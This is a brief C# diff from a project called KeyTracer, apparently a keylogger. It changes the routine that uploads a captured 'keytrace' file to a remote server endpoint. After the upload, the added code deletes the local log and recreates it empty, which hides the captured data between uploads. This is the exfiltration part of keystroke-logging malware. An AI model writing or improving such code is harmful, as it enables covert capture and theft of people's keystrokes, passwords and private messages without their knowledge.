@@ -14,9 +14,22 @@ namespace KeyTracer
         {
             try
             {
+                Consts.isUploading = true;
+
                 WebClient webClient = new WebClient();
 
                 webClient.UploadFile(Consts.Server + Consts.serverKeyTraces, Consts.keytracePath);
+
+                File.Delete(Consts.keytracePath);
+                if (!File.Exists(Consts.keytracePath))
+                {
+                    using (StreamWriter sw = new StreamWriter(Consts.keytracePath))
+                    {
+                        sw.Close();
+                    }
+                }
+
+                Consts.isUploading = false;
 
                 return 1;
             }
